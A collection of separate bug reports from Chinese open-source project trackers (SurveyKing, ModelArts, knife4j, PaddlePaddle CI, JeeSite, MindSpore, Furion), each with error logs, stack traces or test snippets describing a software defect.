给试题添加标签时报错.Invalid utf8mb4 character string,name: '报告Bug ' about: 报告 SurveyKing 的 bug title: '在给试题添加标签时，报错了。Invalid utf8mb4 character string' labels: 'bug' assignees: '' bug 描述 在给试题添加标签时，报错了。标签使用的是中文名称 新加试题时，添加标签是没有问题的。但是如果是修改试题时，添加标签就会出错。 复现步骤 复现代码 在给试题添加标签时，报错了。 版本信息 SurveyKing 版本: [e.g. 0.4.0] 浏览器环境 edge 开发环境 [e.g. mac OS]   <code>: 2022-08-11 10:36:02.851 [XNIO-1 task-3] ERROR c.s.s.c.m.a.GlobalExceptionHandler - handleInternalServerError /api/repos/batch org.springframework.jdbc.UncategorizedSQLException: ### Error updating database. Cause: java.sql.SQLException: Invalid utf8mb4 character string: 'ACED00' ### The error may exist in cn/surveyking/server/mapper/TagMapper.java (best guess) ### The error may involve defaultParameterMap ### The error occurred while setting parameters ### SQL: DELETE FROM t_tag WHERE (entity_id = ?) ### Cause: java.sql.SQLException: Invalid utf8mb4 character string: 'ACED00' ; uncategorized SQLException; SQL state [HY000]; error code [1300]; Invalid utf8mb4 character string: 'ACED00'; nested exception is java.sql.SQLException: Invalid utf8mb4 character string: 'ACED00' at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:92) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:441) at com.sun.proxy.$Proxy83.delete(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.delete(SqlSessionTemplate.java:304) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:69) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$PlainMethodInvoker.invoke(MybatisMapperProxy.java:148) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:89) at com.sun.proxy.$Proxy127.delete(Unknown Source) at com.baomidou.mybatisplus.extension.service.IService.remove(IService.java:149) at com.baomidou.mybatisplus.extension.service.IService$$FastClassBySpringCGLIB$$f8525d18.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) at cn.surveyking.server.impl.TagServiceImpl$$EnhancerBySpringCGLIB$$6b85759d.remove(&lt;generated&gt;) at cn.surveyking.server.impl.RepoServiceImpl.batchAddRepoTemplate(RepoServiceImpl.java:141) at cn.surveyking.server.impl.RepoServiceImpl$$FastClassBySpringCGLIB$$ae174de6.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:783) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:388) at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:698) at cn.surveyking.server.impl.RepoServiceImpl$$EnhancerBySpringCGLIB$$f5826087.batchAddRepoTemplate(&lt;generated&gt;) at cn.surveyking.server.api.RepoApi.batchAddRepoTemplate(RepoApi.java:57) at cn.surveyking.server.api.RepoApi$$FastClassBySpringCGLIB$$e56c4c03.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) at cn.surveyking.server.api.RepoApi$$EnhancerBySpringCGLIB$$6c678486.batchAddRepoTemplate(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:517) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:584) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:111) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:111) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:327) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:81) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:122) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:116) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:126) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:81) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:109) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:149) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at cn.surveyking.server.core.security.JwtTokenFilter.doFilterInternal(JwtTokenFilter.java:65) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:103) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:89) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:110) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:80) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:55) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:211) at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:183) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:354) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:267) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:275) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:79) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:134) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:131) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:255) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:79) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:100) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:387) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:852) at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) at org.xnio.XnioWorker$WorkerThreadFactory$1$1.run(XnioWorker.java:1280) at java.lang.Thread.run(Thread.java:745) Caused by: java.sql.SQLException: Invalid utf8mb4 character string: 'ACED00' at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:129) at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122) at com.mysql.cj.jdbc.ClientPreparedStatement.executeInternal(ClientPreparedStatement.java:953) at com.mysql.cj.jdbc.ClientPreparedStatement.execute(ClientPreparedStatement.java:371) at com.zaxxer.hikari.pool.ProxyPreparedStatement.execute(ProxyPreparedStatement.java:44) at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.execute(HikariProxyPreparedStatement.java) at sun.reflect.GeneratedMethodAccessor95.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.logging.jdbc.PreparedStatementLogger.invoke(PreparedStatementLogger.java:59) at com.sun.proxy.$Proxy162.execute(Unknown Source) at org.apache.ibatis.executor.statement.PreparedStatementHandler.update(PreparedStatementHandler.java:47) at org.apache.ibatis.executor.statement.RoutingStatementHandler.update(RoutingStatementHandler.java:74) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:64) at com.sun.proxy.$Proxy160.update(Unknown Source) at org.apache.ibatis.executor.SimpleExecutor.doUpdate(SimpleExecutor.java:50) at org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:117) at org.apache.ibatis.executor.CachingExecutor.update(CachingExecutor.java:76) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.plugin.Invocation.proceed(Invocation.java:49) at com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor.intercept(MybatisPlusInterceptor.java:106) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:62) at com.sun.proxy.$Proxy159.update(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:194) at org.apache.ibatis.session.defaults.DefaultSqlSession.delete(DefaultSqlSession.java:209) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:427) ... 140 common frames omitted
【AICC】ModelArts训练脚本是否影响MindSpore环境变量DATASET_ENABLE_NUMA,"问题背景：武汉人工智能计算中心，用户在ModelArts上跑训练任务，业务进程在numa划分的八个node分配不均衡，集中在node0上，耗尽node0内存后发生OOM。用户在线下 线上改了run_train.sh 和 davincirun.py 规避后，线程在0~191 CPU节点上分布均匀，用户业务正常运行。 麻烦确认 python subprocess.Popen 启动 command，设置了 preexec_fn=os.setsid 这种启动方式会不会导致 numa cpu / mem 绑定失效   <code>: training_proc = subprocess.Popen(command, env=envs, preexec_fn=os.setsid)"
项目打成war包或者jar后，DynamicResponseParameters失效,SpringBoot版本： knife4j版本： Controller层：   <code>: &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.3.8.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;/parent&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.9&lt;/version&gt; &lt;/dependency&gt;
CI meets error!,"http://ci.paddlepaddle.org/viewLog.html?buildId=14402&amp;buildTypeId=Paddle_PrCi&amp;tab=buildLog   <code>: [09:39:00][Step 1/1] bzip2 set to manually installed. [09:39:00][Step 1/1] gzip is already the newest version (1.6-4ubuntu1). [09:39:00][Step 1/1] sed is already the newest version (4.2.2-7). [09:39:00][Step 1/1] xz-utils is already the newest version (5.1.1alpha+20120614-2ubuntu2). [09:39:00][Step 1/1] xz-utils set to manually installed. [09:39:00][Step 1/1] grep is already the newest version (2.25-1~16.04.1). [09:39:00][Step 1/1] tar is already the newest version (1.28-2.1ubuntu0.1). [09:39:00][Step 1/1] coreutils is already the newest version (8.25-2ubuntu3~16.04). [09:39:00][Step 1/1] Some packages could not be installed. This may mean that you have [09:39:00][Step 1/1] requested an impossible situation or if you are using the unstable [09:39:00][Step 1/1] distribution that some required packages have not yet been created [09:39:00][Step 1/1] or been moved out of Incoming. [09:39:00][Step 1/1] The following information may help to resolve the situation: [09:39:00][Step 1/1] [09:39:00][Step 1/1] The following packages have unmet dependencies: [09:39:00][Step 1/1] zlib1g-dev : Depends: zlib1g (= 1:1.2.8.dfsg-2ubuntu4) but 1:1.2.8.dfsg-2ubuntu4.1 is to be installed [09:39:00][Step 1/1] E: Unable to correct problems, you have held broken packages. [09:39:01][Step 1/1] The command '/bin/sh -c apt-get update &amp;&amp; apt-get install -y --allow-downgrades patchelf git python-pip python-dev python-opencv openssh-server bison libnccl2=2.1.2-1+cuda8.0 libnccl-dev=2.1.2-1+cuda8.0 wget unzip unrar tar xz-utils bzip2 gzip coreutils ntp curl sed grep graphviz libjpeg-dev zlib1g-dev python-matplotlib gcc-4.8 g++-4.8 automake locales clang-format swig cmake liblapack-dev liblapacke-dev clang-3.8 llvm-3.8 libclang-3.8-dev net-tools libtool ccache &amp;&amp; apt-get clean -y' returned a non-zero code: 100 [09:39:01][Step 1/1] [09:39:01][Step 1/1] Process exited with code 100 [09:39:01][Step 1/1] Process exited with code 100 [09:39:02][Step 1/1] Step Build and test (Command Line) failed"
jeesite vue日期插件错误,"生成vue和后台代码 点击修改日期   <code>: 这里贴你的代码块 ```{ label: t('发生时间'), field: 'fstime', component: 'DatePicker', componentProps: { format: 'YYYY-MM-DD HH:mm', showTime: { format: 'HH:mm' }, }, }, ### 实际结果、报错信息、截图 1. ### 环境版本： - JDK版本：1.8、11、17 - 浏览器版本：Chrome xx、Firefox xx、IE xx - 平台版本：JeeSite 4.x.x、5.x.x（pom.xml里查看）"
[CT][MS][DivNoNan]  DivNoNan：Inconsistency of supported data types,"1， 库上原用例在Ascend环境支持int8、int32、int64、uint8，CPU环境不支持。 但目前此算子，不支持int8、int32、int64、uint8了。 int32、int64原库上支持正反， int8、uint8只支持正向。（divnonan算子反向会用到P.Neg算子，Neg算子不支持int8,uint8,divnonan算子反向也不支持int8,uint8） 设计的正常测试用例和异常测试用例，都无法执行通过， 正常测试用例提示类型不支持，但异常测试用例又无法捕获异常。 /mode graph 在Ascend环境，需支持int8、int32、int64、uint8   <code>: def test_divnonan_dtype_int8(): input_x = Tensor(np.random.randint(low=-100, high=2000, size=(512, 4)), dtype=mstype.int8) input_y = Tensor(np.random.randint(low=-100, high=2000, size=(512, 4)), dtype=mstype.int8) fact = DivNoNanMock(inputs=[input_x, input_y]) &gt; fact.forward_cmp() test_divnonan.py:614: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/divnonan_ops.py:123: in forward_cmp out_tf = self.forward_tensorflow_impl() ../share/ops/primitive/divnonan_ops.py:63: in forward_tensorflow_impl out = tf.math.divide_no_nan(self.input_x_np, self.input_y_np) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/tensorflow/python/util/dispatch.py:206: in wrapper return target(*args, **kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/tensorflow/python/util/dispatch.py:206: in wrapper return target(*args, **kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/tensorflow/python/ops/math_ops.py:1599: in div_no_nan return gen_math_ops.div_no_nan(x, y, name=name) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/tensorflow/python/ops/gen_math_ops.py:3143: in div_no_nan ""DivNoNan"", x=x, y=y, name=name) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/tensorflow/python/framework/op_def_library.py:630: in _apply_op_helper param_name=input_name) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ dtype = tf.int8 attr_def = name: ""T"" type: ""type"" allowed_values { list { type: DT_HALF type: DT_FLOAT type: DT_BFLOAT16 type: DT_DOUBLE type: DT_COMPLEX64 type: DT_COMPLEX128 } } param_name = 'x' def _SatisfiesTypeConstraint(dtype, attr_def, param_name): if attr_def.HasField(""allowed_values""): allowed_list = attr_def.allowed_values.list.type if dtype not in allowed_list: raise TypeError( ""Value passed to parameter '%s' has DataType %s not in list of "" ""allowed values: %s"" % (param_name, dtypes.as_dtype(dtype).name, &gt; "", "".join(dtypes.as_dtype(x).name for x in allowed_list))) E TypeError: Value passed to parameter 'x' has DataType int8 not in list of allowed values: float16, float32, bfloat16, float64, complex64, complex128 def test_divnonan_input_int32_error(): input_x = Tensor(np.random.randn(32, 8, 8), dtype=mstype.int32) input_y = Tensor(np.random.randn(32, 8, 8), dtype=mstype.int32) fact = DivNoNanMock(inputs=[input_x, input_y]) with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() E Failed: DID NOT RAISE &lt;class 'TypeError'&gt;"
"[MS][LITE][master][mix_datatype] When the ToString function is invoked for the LoadConfig interface return value, no return value is returned.",": /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 配置文件加载成功，返回值状态码类Status对象，使用其公有函数ToString函数未获取到具体错误信息。 1.配置文件加载成功，状态码类Status对象，可以使用其公有函数StatusCode或ToString函数来获取具体错误码及错误信息。   <code>: TEST(GE_API_LITE, Unify_LoadConfig_006) { printf(""===========================\n""); size_t size; size_t *ptr_size = &amp;size; const char *modelPath = ""./data/model/ml_video_edit_imitate_filter.ms""; char *graphBuf = ReadFile(modelPath, ptr_size); printf(""==========Context==========\n""); auto context = std::make_shared&lt;Context&gt;(); context-&gt;SetThreadNum(2); auto cpu_context = std::make_shared&lt;CPUDeviceInfo&gt;(); cpu_context-&gt;SetEnableFP16(false); ASSERT_EQ(cpu_context-&gt;GetEnableFP16(), false); context-&gt;MutableDeviceInfo().push_back(cpu_context); Model model; printf(""==========LoadConfig_MixDataType_config==========\n""); const std::string &amp;config_path=""""; Status load_ret = model.LoadConfig(config_path); std::cout &lt;&lt; ""LoadConfig StatusCode:"" &lt;&lt; static_cast&lt;int&gt;(load_ret.StatusCode()) &lt;&lt; std::endl; std::cout &lt;&lt; ""LoadConfig ToString:"" &lt;&lt; load_ret.ToString() &lt;&lt; std::endl; ASSERT_EQ(load_ret, kLiteFileError); } LoadConfig StatusCode:-10 LoadConfig ToString: [GE_API_LITE_Unify_LoadConfig_006]:Success"
[UnitOfWork]属性如果贴在使用ISqlDispatchProxy实现的SQL方法是会报Connetion错误,"_sql 通过ISqlDispatchProxy 实现。我测试了用实现IRepository 实现是不会报这个错误 报错内容   <code>: [AllowAnonymous] [UnitOfWork] [Route(""/api/home/update-user"")] public int UpdateUserInfo(UpdateUserParam param) { int iCount = _sql.ExistsUser(param.LoginName); if (iCount == 1) { _sql.UpdatePsw(param.LoginName, StringHelper.EncodeUtf8Base64(param.NewPassword)); } return iCount; } System.InvalidOperationException: The connection was not closed. The connection's current state is open. at Microsoft.Data.ProviderBase.DbConnectionInternal.TryOpenConnection(DbConnection outerConnection, DbConnectionFactory connectionFactory, TaskCompletionSource`1 retry, DbConnectionOptions userOptions) at Microsoft.Data.SqlClient.SqlConnection.TryOpen(TaskCompletionSource`1 retry, SqlConnectionOverrides overrides) at Microsoft.Data.SqlClient.SqlConnection.Open(SqlConnectionOverrides overrides) at Microsoft.Data.SqlClient.SqlConnection.Open() at StackExchange.Profiling.Data.ProfiledDbConnection.Open() in C:\projects\dotnet\src\MiniProfiler.Shared\Data\ProfiledDbConnection.cs:line 121 at Furion.DatabaseAccessor.DbObjectExtensions.OpenConnection(DatabaseFacade databaseFacade, DbConnection dbConnection) at Furion.DatabaseAccessor.DbObjectExtensions.PrepareDbCommand(DatabaseFacade databaseFacade, String sql, Object model, CommandType commandType) at Furion.DatabaseAccessor.SqlAdoNetExtensions.ExecuteNonQuery(DatabaseFacade databaseFacade, String sql, Object model, CommandType commandType) at Furion.DatabaseAccessor.SqlDispatchProxy.ExecuteSql(SqlProxyMethod sqlProxyMethod) at Furion.DatabaseAccessor.SqlDispatchProxy.Invoke(MethodInfo targetMethod, Object[] args) --- End of stack trace from previous location --- at System.Reflection.DispatchProxyGenerator.Invoke(Object[] args) at generatedProxy_1.UpdatePsw(String , String ) at SmartSearch.Application.Services.HomeService.UpdateUserInfo(UpdateUserParam param) in E:\Work\SmartSearchWeb\SmartSearchWeb\SmartSearch.Application\Services\HomeService.cs:line 236 at lambda_method65(Closure , Object , Object[] ) at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.SyncObjectResultExecutor.Execute(IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.&lt;InvokeActionMethodAsync&gt;g__Logged|12_1(ControllerActionInvoker invoker) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.&lt;InvokeNextActionFilterAsync&gt;g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync() --- End of stack trace from previous location --- at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.&lt;InvokeNextExceptionFilterAsync&gt;g__Awaited|25_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)"
安装包代码和源码不一致,"conda环境中安装mindspore_ascend版本为1.1.0，安装环境下文件mindspore/ops/operations/nn_ops.py下MaxPool的定义为 但gitee仓上源码r1.1的源码为： conda环境安装1.1.1版本后，源码和安装代码一致   <code>: def __init__(self, ksize=1, strides=1, padding=""valid"", data_format=""NCHW""): def __init__(self, kernel_size=1, strides=1, pad_mode=""valid"", data_format=""NCHW""):"
